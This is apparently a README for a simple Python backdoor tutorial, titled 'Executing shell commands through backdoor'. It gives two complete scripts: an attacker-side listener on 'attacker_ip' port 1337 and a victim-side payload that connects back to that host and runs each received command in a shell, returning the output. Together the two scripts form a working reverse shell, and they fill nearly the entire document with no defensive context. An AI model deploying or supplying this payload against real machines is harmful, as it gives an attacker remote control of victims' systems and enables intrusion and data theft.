<h2 align="center">Executing shell commands through backdoor</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

- - - - - - - - - - - - - - - - - - - - - -
> [listener.py](listener.py)
```python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()
print(f"Connected to {address}")

while True:
	cmd = input("enter a command: ")
	
	## if you want to quit and close the connection
	if cmd == "quit":
		connection.send(b"quit") # send quit message in bytes
		connection.close()	# close the connection
		break				# break the loop to stop
		
	connection.send(bytes(cmd, "utf-8")) 
	
	output = connection.recv(2048)
	print(output.decode("utf-8"))

print("Server has stopped")
```
---
> [payload.py](payload.py)
```python
import socket
import subprocess

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

while True:
	cmd = payload.recv(2048)
	
	## if you want to quit and close the connection
	if cmd == b"quit":
		payload.close() # close the connection
		break			# break the loop to stop
		
	cmd = cmd.decode("utf-8")
	output = subprocess.check_output(cmd, shell = True)
	payload.send(output)

print("Disconnected") # display disconnection message
```